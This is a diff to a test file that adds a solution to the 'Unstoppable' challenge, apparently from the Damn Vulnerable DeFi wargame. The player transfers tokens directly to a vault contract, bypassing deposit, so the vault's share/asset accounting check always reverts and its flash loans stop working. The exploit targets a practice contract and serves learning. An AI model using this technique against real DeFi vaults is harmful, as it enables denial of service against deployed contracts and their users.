@@ -45,6 +45,19 @@ describe('[Challenge] Unstoppable', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        /* 
+        Revert will be triggered if the following condition is true
+        uint256 balanceBefore = totalAssets();
+        if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance();
+
+        By transferring token to the vault contract (without using vault.deposit)
+        totalAssets will be increased, but totalSupply will not (because we didn't use vault.deposit)
+         */
+        console.log("---- Execution ----")
+        console.log("DVT allowance before approval: ", await token.allowance(player.address, vault.address));
+        // await token.connect(player).approve(vault.address, INITIAL_PLAYER_TOKEN_BALANCE)
+        console.log("DVT allowance after approval: ", await token.allowance(player.address, vault.address));
+        await token.connect(player).transfer(vault.address, INITIAL_PLAYER_TOKEN_BALANCE)
     });
 
     after(async function () {
